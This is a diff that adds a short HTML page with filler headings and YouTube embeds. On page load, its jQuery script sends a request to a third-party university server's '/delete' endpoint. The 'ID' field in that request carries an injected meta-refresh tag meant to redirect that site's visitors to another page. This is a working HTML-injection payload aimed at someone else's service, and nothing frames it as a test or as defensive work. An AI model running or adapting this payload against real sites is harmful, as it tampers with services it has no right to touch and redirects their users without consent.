@@ -1,0 +1,37 @@
+<html>
+    <head>
+        <meta http-equiv="X-Frame-Options" content="ALLOW-FROM *">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.js"></script>
+        <script>
+            $(function(){
+                dd = $("body *")
+                alert(dd.length)
+                //$("body *").remove()
+                var str = '<iframe width="100%" height="100%" src="https://www.youtube.com/embed/QH2-TGUlwu4" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>'
+            
+               //$("body").append(str)
+
+
+
+str2='\n<meta http-equiv="Refresh" content="0;url=http://cpc.people.com.cn/BIG5/">\n'
+  $.ajax({
+    method:"get",
+    url:"https://luffy.ee.ncku.edu.tw:11998/delete",
+    data:{
+      ID   :str2
+    },
+    success:function(data){
+      console.log("OK")
+    }
+  });
+            })
+        </script>
+    </head>
+
+    <body>
+        
+        <h1>TTTT</h1>
+        <h1>TTTT</h1>
+        <iframe width="954" height="636" src="https://www.youtube.com/embed/QH2-TGUlwu4" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+    </body>
+</html>
